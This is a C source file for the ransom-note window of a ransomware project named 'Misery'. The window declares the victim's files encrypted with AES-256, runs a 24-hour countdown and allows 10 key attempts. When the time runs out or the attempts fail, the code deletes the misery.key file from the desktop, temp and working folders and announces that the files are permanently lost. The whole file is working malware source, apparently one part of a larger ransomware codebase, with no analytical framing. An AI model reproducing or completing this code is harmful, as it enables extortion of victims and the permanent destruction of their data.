/*
 * ransomnote.c  —  Native Win32 Ransom Note Window
 *
 * FIXES APPLIED:
 *  1. DECRYPT_KEY, DECRYPT_BTN, STATUS are now DIRECT children of hWnd
 *     so WM_COMMAND reaches RansomWndProc (was nested under STATIC → dead).
 *  2. Key input parser accepts:
 *       - pure 64-char hex key
 *       - full two-line misery.key content (salt\nkey)
 *       - key with whitespace/newlines
 *  3. Attempts counter updates on every click
 *  4. Status text always updates; wrong key vs success reproduced correctly
 */

#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <process.h>
#include <shlobj.h>
#include <ctype.h>
#include "ransomnote.h"
#include "crypto.h"
#include "fileops.h"
#include "misery_config.h"

/* —— Colour palette —— */
#define CLR_BG          RGB(245, 225, 225)
#define CLR_BANNER_BG   RGB(40,   8,   8)
#define CLR_ACCENT      RGB(60, 160,  80)
#define CLR_ACCENT_DARK RGB(35, 110,  50)
#define CLR_HEADLINE    RGB(220,  80,  80)
#define CLR_WHITE       RGB(248, 248, 248)
#define CLR_CARD_BG     RGB(50,  12,  12)
#define CLR_CARD_TEXT   RGB(230, 200, 200)
#define CLR_BODY_TEXT   RGB(30,  15,  15)
#define CLR_CODE_BG     RGB(235, 252, 235)
#define CLR_DECRYPT_BG  RGB(225, 240, 225)
#define CLR_TIMER_RED   RGB(220,   0,   0)
#define CLR_TIMER_BG    RGB(60,   8,   8)

#define WC_RANSOM   L"MiseryRansomNote"
#define WIN_TITLE   L"MISERY - Security Event"

/* —— Control IDs —— */
#define IDC_CLOSE        1001
#define IDC_DECRYPT_KEY  1002
#define IDC_DECRYPT_BTN  1003
#define IDC_STATUS       1004
#define IDC_TIMER        1005
#define IDC_ATTEMPTS     1006

#define WM_DECRYPT_DONE (WM_APP + 1)

/* —— Brushes and fonts —— */
static HBRUSH  g_hbrBanner    = NULL;
static HBRUSH  g_hbrBg        = NULL;
static HBRUSH  g_hbrCard      = NULL;
static HBRUSH  g_hbrAccent    = NULL;
static HBRUSH  g_hbrCodeBg    = NULL;
static HBRUSH  g_hbrDecryptBg = NULL;
static HBRUSH  g_hbrTimerBg   = NULL;
static HBRUSH  g_hbrCloseBtn  = NULL;
static HFONT   g_hFontHead    = NULL;
static HFONT   g_hFontSub     = NULL;
static HFONT   g_hFontBody    = NULL;
static HFONT   g_hFontSmall   = NULL;
static HFONT   g_hFontMono    = NULL;
static HFONT   g_hFontName    = NULL;
static HFONT   g_hFontTimer   = NULL;

/* —— Module state —— */
static ULONGLONG g_timerEndFileTime = 0;
static int       g_decryptAttempts  = 0;
static const int MAX_DECRYPT_ATTEMPTS = 10;

/* —— Forward declarations —— */
static LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
static void     CreateResources(void);
static void     DestroyResources(void);
static void     UpdateTimerDisplay(HWND hWnd);
static void     UpdateAttemptsDisplay(HWND hWnd);
static void     DestroyKeyAndClose(HWND hWnd);
static int      NormalizeKeyInput(const char *raw, char *outKey, size_t outSize);

void ShowRansomNoteWindow(void);

/* —— Decrypt thread parameter —— */
typedef struct {
    char  key[256];
    HWND  hWnd;
} DECRYPT_THREAD_PARAMS;

/* —— Decrypt worker thread —— */
static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
    DECRYPT_THREAD_PARAMS *p = (DECRYPT_THREAD_PARAMS *)lpParam;
    FILEOPS_STATS stats = {0};
    BOOL success = FALSE;

    if (p && p->key[0] != '\0') {
        success = MiseryRunDecrypt(p->key, &stats) ? TRUE : FALSE;
    }

    if (p && p->hWnd && IsWindow(p->hWnd)) {
        /*
         * Convention used by WM_DECRYPT_DONE:
         *   wParam == (WPARAM)-1  → wrong key / hard failure
         *   wParam >= 0           → success; value = filesSucceeded
         *   lParam                → filesFailed (only meaningful on success)
         */
        PostMessage(p->hWnd, WM_DECRYPT_DONE,
                    success ? (WPARAM)stats.filesSucceeded : (WPARAM)-1,
                    success ? (LPARAM)stats.filesFailed    : 0);
    }

    if (p) free(p);
    return 0;
}

/*
 * FIX: Accept either:
 *   (a) pure 64-char hex key
 *   (b) full misery.key text:  "<32-hex-salt>\n<64-hex-key>"
 *   (c) key with spaces/CR/LF clutter
 * Returns 1 on success and writes 64 hex chars + NUL into outKey.
 */
static int NormalizeKeyInput(const char *raw, char *outKey, size_t outSize) {
    char cleaned[512];
    size_t n = 0;
    size_t i;

    if (!raw || !outKey || outSize < 65) return 0;

    /* Strip all non-hex characters */
    for (i = 0; raw[i] != '\0' && n < sizeof(cleaned) - 1; i++) {
        unsigned char c = (unsigned char)raw[i];
        if (isxdigit(c)) {
            cleaned[n++] = (char)tolower(c);
        }
    }
    cleaned[n] = '\0';

    if (n == 64) {
        /* Pure key */
        memcpy(outKey, cleaned, 64);
        outKey[64] = '\0';
        return 1;
    }

    if (n == 96) {
        /*
         * Full key file content as hex stream:
         *   first 32 chars = salt (ignored by GUI decrypt — salt comes from file header)
         *   next  64 chars = key
         */
        memcpy(outKey, cleaned + 32, 64);
        outKey[64] = '\0';
        return 1;
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * Show the ransom note window (blocking)
 * ═══════════════════════════════════════════════════════════════════════ */
void ShowRansomNoteWindow(void) {
    HMODULE hInst = GetModuleHandle(NULL);
    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_WIN95_CLASSES };
    InitCommonControlsEx(&icc);

    CreateResources();

    WNDCLASSEXW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = RansomWndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = g_hbrBg;
    wc.lpszClassName = WC_RANSOM;
    wc.hIcon         = LoadIcon(NULL, IDI_WARNING);
    wc.hIconSm       = LoadIcon(NULL, IDI_WARNING);
    RegisterClassExW(&wc);

    /* Timer MUST be set before CreateWindowExW (WM_CREATE fires inside it) */
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    g_timerEndFileTime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    g_timerEndFileTime += (ULONGLONG)24 * 60 * 60 * 10000000ULL; /* 24 hours */
    g_decryptAttempts = 0;

    int winW = 860, winH = 750;
    int scrW = GetSystemMetrics(SM_CXSCREEN);
    int scrH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (scrW - winW) / 2;
    int posY = (scrH - winH) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        WC_RANSOM, WIN_TITLE,
        WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
        posX, posY, winW, winH,
        NULL, NULL, hInst, NULL
    );

    if (!hWnd) { DestroyResources(); return; }

    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DestroyResources();
}

/* ═══════════════════════════════════════════════════════════════════════
 * WINDOW PROC
 * ═══════════════════════════════════════════════════════════════════════ */
static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    case WM_CREATE: {
        HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);

        /* —— Banner (decorative only) —— */
        HWND hBanner = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            0, 0, 860, 170, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 860, 5, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"\U0001F512", WS_CHILD | WS_VISIBLE,
            30, 20, 60, 50, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"YOUR FILES HAVE BEEN ENCRYPTED",
            WS_CHILD | WS_VISIBLE, 100, 18, 700, 40, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"All your documents, images, databases, and source code "
            L"have been locked with AES-256 encryption.",
            WS_CHILD | WS_VISIBLE, 100, 60, 700, 22, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"  \u2713  ENCRYPTION COMPLETE  ",
            WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
            100, 92, 240, 28, hBanner, NULL, hInst, NULL);

        /*
         * Timer is a DIRECT child of hWnd so GetDlgItem / colouring work.
         */
        CreateWindowExW(0, L"STATIC", L"24:00:00",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);

        /* —— Instructions —— */
        const WCHAR *instructions =
            L"=========================================================\n"
            L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
            L"=========================================================\n\n"
            L"  1. DO NOT modify encrypted files yourself.\n"
            L"  2. DO NOT delete misery.key.\n"
            L"  3. Paste the 64-character KEY (second line of misery.key)\n"
            L"     into the box below and click DECRYPT FILES.\n"
            L"  4. You have 24 hours and 10 attempts.\n\n"
            L"  WARNING: Wrong key attempts are limited.\n"
            L"           After 10 failures the key is destroyed.";

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", instructions,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY |
            ES_AUTOVSCROLL | ES_LEFT,
            30, 185, 800, 160, hWnd, NULL, hInst, NULL);

        /* —— Contact card (decorative) —— */
        HWND hCard = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE, 30, 360, 800, 85, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 5, 85, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"About Author",
            WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
            WS_CHILD | WS_VISIBLE, 20, 32, 500, 32, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
            WS_CHILD | WS_VISIBLE, 20, 63, 500, 20, hCard, NULL, hInst, NULL);

        /*
         * ============================================================
         * FIX: DECRYPT CONTROLS ARE DIRECT CHILDREN OF hWnd
         *
         * Previously they were children of a STATIC panel. STATIC does
         * not forward WM_COMMAND, so button clicks never reached us.
         * Coordinates are absolute relative to the main client area
         * (old panel was at 30,460 — controls keep the same on-screen
         * positions by adding the panel offset).
         * ============================================================
         */

        /* Decrypt panel background (decorative only — no interactive kids) */
        CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            30, 460, 800, 130, hWnd, NULL, hInst, NULL);

        /* Labels (decorative) */
        CreateWindowExW(0, L"STATIC", L"DECRYPT YOUR FILES HERE:",
            WS_CHILD | WS_VISIBLE,
            45, 465, 300, 22, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Enter the 64-char hex key (or paste whole misery.key):",
            WS_CHILD | WS_VISIBLE,
            45, 490, 500, 18, hWnd, NULL, hInst, NULL);

        /*
         * KEY EDIT — direct child of hWnd, GetDlgItem(hWnd, IDC_DECRYPT_KEY) works.
         * Limit raised to 256 so user can paste full two-line key file.
         */
        {
            HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_MULTILINE | WS_TABSTOP,
                45, 512, 500, 28, hWnd, (HMENU)IDC_DECRYPT_KEY, hInst, NULL);
            SendMessage(hKeyEdit, EM_LIMITTEXT, 256, 0);
            if (g_hFontMono) SendMessage(hKeyEdit, WM_SETFONT, (WPARAM)g_hFontMono, TRUE);
        }

        /* DECRYPT BUTTON — direct child of hWnd, so WM_COMMAND reaches us */
        CreateWindowExW(0, L"BUTTON", L"DECRYPT FILES",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            560, 510, 150, 32, hWnd, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);

        /* STATUS — direct child of hWnd */
        CreateWindowExW(0, L"STATIC", L"Ready. Paste key and click DECRYPT FILES.",
            WS_CHILD | WS_VISIBLE,
            45, 550, 760, 24, hWnd, (HMENU)IDC_STATUS, hInst, NULL);

        /* —— Footer reference —— */
        WCHAR refBuf[512];
        wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
        wcscat(refBuf, L"Key File:        Desktop\\misery.key  OR  %TEMP%\\misery.key\n");
        wcscat(refBuf, L"Algorithm:       AES-256-CBC  +  HMAC-SHA256");

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", refBuf,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
            30, 605, 800, 50, hWnd, NULL, hInst, NULL);

        /* —— Bottom bar —— */
        CreateWindowExW(0, L"STATIC", L"Attempts: 0 / 10",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            30, 670, 300, 35, hWnd, (HMENU)IDC_ATTEMPTS, hInst, NULL);

        CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            680, 670, 130, 40, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);

        SetTimer(hWnd, 1, 1000, NULL);
        return 0;
    }

    case WM_TIMER: {
        if (wParam == 1) {
            UpdateTimerDisplay(hWnd);

            FILETIME ftNow;
            GetSystemTimeAsFileTime(&ftNow);
            ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

            if (now >= g_timerEndFileTime) {
                KillTimer(hWnd, 1);
                DestroyKeyAndClose(hWnd);
                return 0;
            }
        }
        return 0;
    }

    case WM_CTLCOLORSTATIC: {
        HDC     hdc   = (HDC)wParam;
        HWND    hCtrl = (HWND)lParam;
        WCHAR   winText[128] = {0};
        GetWindowTextW(hCtrl, winText, 128);

        if (hCtrl == GetDlgItem(hWnd, IDC_TIMER)) {
            SetTextColor(hdc, CLR_TIMER_RED);
            SetBkColor(hdc, CLR_TIMER_BG);
            SelectObject(hdc, g_hFontTimer);
            return (LRESULT)g_hbrTimerBg;
        }
        if (hCtrl == GetDlgItem(hWnd, IDC_ATTEMPTS)) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_BANNER_BG);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrBanner;
        }
        if (hCtrl == GetDlgItem(hWnd, IDC_STATUS)) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrBg;
        }
        if (wcsstr(winText, L"YOUR FILES HAVE BEEN ENCRYPTED")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontHead);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"All your documents")) {
            SetTextColor(hdc, RGB(200, 170, 170));
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontSub);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"ENCRYPTION COMPLETE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontSmall);
            return (LRESULT)g_hbrAccent;
        }
        if (wcsstr(winText, L"Jahanzaib Ashraf Mir")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontName);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Cybersec Engineer")) {
            SetTextColor(hdc, CLR_CARD_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"\U0001F512")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"DECRYPT YOUR FILES")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Enter the 64-char")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        SetTextColor(hdc, CLR_BODY_TEXT);
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, g_hFontBody);
        return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
    }

    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR winText[256] = {0};
        GetWindowTextW(hCtrl, winText, 256);

        if (wcsstr(winText, L"INSTRUCTIONS")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkColor(hdc, CLR_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrBg;
        }
        if (wcsstr(winText, L"Reference Code:")) {
            SetTextColor(hdc, RGB(20, 60, 20));
            SetBkColor(hdc, CLR_CODE_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrCodeBg;
        }
        /* Key edit */
        SetTextColor(hdc, RGB(0, 40, 0));
        SetBkColor(hdc, CLR_DECRYPT_BG);
        SelectObject(hdc, g_hFontMono);
        return (LRESULT)g_hbrDecryptBg;
    }

    case WM_CTLCOLORBTN: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR btnText[32] = {0};
        GetWindowTextW(hCtrl, btnText, 32);

        if (wcsstr(btnText, L"CLOSE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_HEADLINE);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrCloseBtn;
        }
        if (wcsstr(btnText, L"DECRYPT")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrAccent;
        }
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_CLOSE) {
            DestroyWindow(hWnd);
            return 0;
        }

        if (LOWORD(wParam) == IDC_DECRYPT_BTN) {
            HWND hKeyEdit = GetDlgItem(hWnd, IDC_DECRYPT_KEY);
            HWND hStatus  = GetDlgItem(hWnd, IDC_STATUS);
            HWND hBtn     = GetDlgItem(hWnd, IDC_DECRYPT_BTN);

            if (!hKeyEdit || !hStatus || !hBtn) {
                MessageBoxA(hWnd,
                    "Internal error: decrypt controls not found.\n"
                    "Rebuild with fixed ransomnote.c",
                    "UI Error", MB_OK | MB_ICONERROR);
                return 0;
            }

            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) exceeded.\n"
                    "The key will now be destroyed.",
                    "Access Denied", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            /* Read raw text from the edit control */
            WCHAR keyWide[300] = {0};
            GetWindowTextW(hKeyEdit, keyWide, 300);

            char keyRaw[300] = {0};
            WideCharToMultiByte(CP_UTF8, 0, keyWide, -1, keyRaw, sizeof(keyRaw), NULL, NULL);

            /* Normalize: accept pure key OR full key-file paste */
            char key[65] = {0};
            if (!NormalizeKeyInput(keyRaw, key, sizeof(key))) {
                SetWindowTextA(hStatus,
                    "Invalid key. Paste the 64-char KEY (2nd line of misery.key).");
                MessageBoxA(hWnd,
                    "Invalid key format.\n\n"
                    "misery.key looks like:\n"
                    "  <32 hex chars>   <-- salt (ignore)\n"
                    "  <64 hex chars>   <-- KEY (paste this)\n\n"
                    "Or paste the entire file contents.",
                    "Bad Key", MB_OK | MB_ICONWARNING);
                return 0;
            }

            /* Count attempt ONLY after we have a plausible key */
            g_decryptAttempts++;
            UpdateAttemptsDisplay(hWnd);

            EnableWindow(hBtn, FALSE);
            SetWindowTextA(hStatus, "Decrypting files... please wait.");
            UpdateWindow(hStatus);

            DECRYPT_THREAD_PARAMS *params =
                (DECRYPT_THREAD_PARAMS *)malloc(sizeof(DECRYPT_THREAD_PARAMS));
            if (!params) {
                SetWindowTextA(hStatus, "Out of memory.");
                EnableWindow(hBtn, TRUE);
                return 0;
            }

            memset(params, 0, sizeof(*params));
            strncpy(params->key, key, sizeof(params->key) - 1);
            params->hWnd = hWnd;

            HANDLE hThread = (HANDLE)_beginthreadex(
                NULL, 0, DecryptThreadProc, params, 0, NULL);
            if (!hThread) {
                free(params);
                SetWindowTextA(hStatus, "Failed to start decryption thread.");
                EnableWindow(hBtn, TRUE);
                return 0;
            }
            CloseHandle(hThread);
            return 0;
        }
        break;

    case WM_DECRYPT_DONE: {
        HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
        HWND hBtn    = GetDlgItem(hWnd, IDC_DECRYPT_BTN);

        /* wParam is unsigned — compare carefully for "failure" sentinel */
        LONGLONG succeeded;
        LONGLONG failed = (LONGLONG)lParam;

        if (wParam == (WPARAM)-1) {
            succeeded = -1;
        } else {
            succeeded = (LONGLONG)wParam;
        }

        char msgBuf[512];

        if (succeeded < 0) {
            int remaining = MAX_DECRYPT_ATTEMPTS - g_decryptAttempts;
            if (remaining < 0) remaining = 0;

            snprintf(msgBuf, sizeof(msgBuf),
                "Decryption FAILED: wrong key or corrupt data. Attempts left: %d / %d",
                remaining, MAX_DECRYPT_ATTEMPTS);

            if (hStatus) SetWindowTextA(hStatus, msgBuf);

            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) reached.\n"
                    "The encryption key is now being destroyed.\n"
                    "YOUR FILES ARE PERMANENTLY LOST.",
                    "KEY DESTROYED", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            MessageBoxA(hWnd, msgBuf, "Decryption Failed", MB_OK | MB_ICONWARNING);
            if (hBtn) EnableWindow(hBtn, TRUE);

        } else {
            if (failed == 0 && succeeded == 0) {
                snprintf(msgBuf, sizeof(msgBuf),
                    "No encrypted files found. Nothing to decrypt.");
            } else {
                snprintf(msgBuf, sizeof(msgBuf),
                    "Decryption complete: %lld recovered, %lld failed.",
                    succeeded, failed);
            }
            if (hStatus) SetWindowTextA(hStatus, msgBuf);
            MessageBoxA(hWnd, msgBuf, "Decryption Result", MB_OK | MB_ICONINFORMATION);
            if (hBtn) EnableWindow(hBtn, TRUE);
        }
        return 0;
    }

    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

/* —— Update timer display —— */
static void UpdateTimerDisplay(HWND hWnd) {
    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);
    ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

    if (now >= g_timerEndFileTime) {
        SetDlgItemTextA(hWnd, IDC_TIMER, "00:00:00");
        return;
    }

    ULONGLONG diff100ns = g_timerEndFileTime - now;
    ULONGLONG totalSeconds = diff100ns / 10000000ULL;

    DWORD hours   = (DWORD)(totalSeconds / 3600);
    DWORD minutes = (DWORD)((totalSeconds % 3600) / 60);
    DWORD seconds = (DWORD)(totalSeconds % 60);

    char timeBuf[32];
    snprintf(timeBuf, sizeof(timeBuf), "%02lu:%02lu:%02lu", hours, minutes, seconds);
    SetDlgItemTextA(hWnd, IDC_TIMER, timeBuf);
}

/* —— Update attempts display —— */
static void UpdateAttemptsDisplay(HWND hWnd) {
    char buf[64];
    snprintf(buf, sizeof(buf), "Attempts: %d / %d",
             g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
    SetDlgItemTextA(hWnd, IDC_ATTEMPTS, buf);
    MiseryLog(MISERY_LOG_INFO, "RansomNote: Attempts updated: %d/%d",
              g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
}

/* —— Destroy key and close —— */
static void DestroyKeyAndClose(HWND hWnd) {
    MiseryLog(MISERY_LOG_WARN, "RansomNote: Key destruction triggered!");

    DeleteFileA("misery.key");

    char desktop[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        DeleteFileA(keyPath);
    }

    char tempPath[MAX_PATH] = {0};
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath3[MAX_PATH * 2];
        snprintf(keyPath3, sizeof(keyPath3), "%s\\misery.key", tempPath);
        DeleteFileA(keyPath3);
    }

    char curDir[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, curDir);
    if (_stricmp(curDir, desktop) != 0 && _stricmp(curDir, tempPath) != 0) {
        char keyPath2[MAX_PATH * 2];
        snprintf(keyPath2, sizeof(keyPath2), "%s\\misery.key", curDir);
        DeleteFileA(keyPath2);
    }

    CleanupCrypto();

    MessageBoxA(hWnd,
        "TIME EXPIRED — The decryption key has been destroyed.\n"
        "YOUR FILES ARE PERMANENTLY UNRECOVERABLE.",
        "FILES LOST FOREVER", MB_OK | MB_ICONERROR);

    KillTimer(hWnd, 1);
    DestroyWindow(hWnd);
}

/* —— Resource creation —— */
static void CreateResources(void) {
    g_hbrBanner    = CreateSolidBrush(CLR_BANNER_BG);
    g_hbrBg        = CreateSolidBrush(CLR_BG);
    g_hbrCard      = CreateSolidBrush(CLR_CARD_BG);
    g_hbrAccent    = CreateSolidBrush(CLR_ACCENT_DARK);
    g_hbrCodeBg    = CreateSolidBrush(CLR_CODE_BG);
    g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);
    g_hbrTimerBg   = CreateSolidBrush(CLR_TIMER_BG);
    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE);

    LOGFONTW lf;
    ZeroMemory(&lf, sizeof(lf));

    lf.lfHeight  = -26; lf.lfWeight = FW_BOLD;
    lf.lfQuality = CLEARTYPE_QUALITY;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontHead = CreateFontIndirectW(&lf);

    lf.lfHeight = -14; lf.lfWeight = FW_NORMAL;
    g_hFontSub = CreateFontIndirectW(&lf);

    lf.lfHeight = -13;
    g_hFontBody = CreateFontIndirectW(&lf);

    lf.lfHeight = -11; lf.lfWeight = FW_BOLD;
    g_hFontSmall = CreateFontIndirectW(&lf);

    lf.lfHeight = -12; lf.lfWeight = FW_NORMAL;
    wcscpy(lf.lfFaceName, L"Consolas");
    g_hFontMono = CreateFontIndirectW(&lf);

    lf.lfHeight = -22; lf.lfWeight = FW_BOLD;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontName = CreateFontIndirectW(&lf);

    lf.lfHeight = -36; lf.lfWeight = FW_BOLD;
    wcscpy(lf.lfFaceName, L"Consolas");
    g_hFontTimer = CreateFontIndirectW(&lf);
}

static void DestroyResources(void) {
    if (g_hbrBanner)    DeleteObject(g_hbrBanner);
    if (g_hbrBg)        DeleteObject(g_hbrBg);
    if (g_hbrCard)      DeleteObject(g_hbrCard);
    if (g_hbrAccent)    DeleteObject(g_hbrAccent);
    if (g_hbrCodeBg)    DeleteObject(g_hbrCodeBg);
    if (g_hbrDecryptBg) DeleteObject(g_hbrDecryptBg);
    if (g_hbrTimerBg)   DeleteObject(g_hbrTimerBg);
    if (g_hbrCloseBtn)  DeleteObject(g_hbrCloseBtn);
    if (g_hFontHead)    DeleteObject(g_hFontHead);
    if (g_hFontSub)     DeleteObject(g_hFontSub);
    if (g_hFontBody)    DeleteObject(g_hFontBody);
    if (g_hFontSmall)   DeleteObject(g_hFontSmall);
    if (g_hFontMono)    DeleteObject(g_hFontMono);
    if (g_hFontName)    DeleteObject(g_hFontName);
    if (g_hFontTimer)   DeleteObject(g_hFontTimer);

    g_hbrBanner = g_hbrBg = g_hbrCard = g_hbrAccent = NULL;
    g_hbrCodeBg = g_hbrDecryptBg = g_hbrTimerBg = g_hbrCloseBtn = NULL;
    g_hFontHead = g_hFontSub = g_hFontBody = g_hFontSmall = NULL;
    g_hFontMono = g_hFontName = g_hFontTimer = NULL;
}
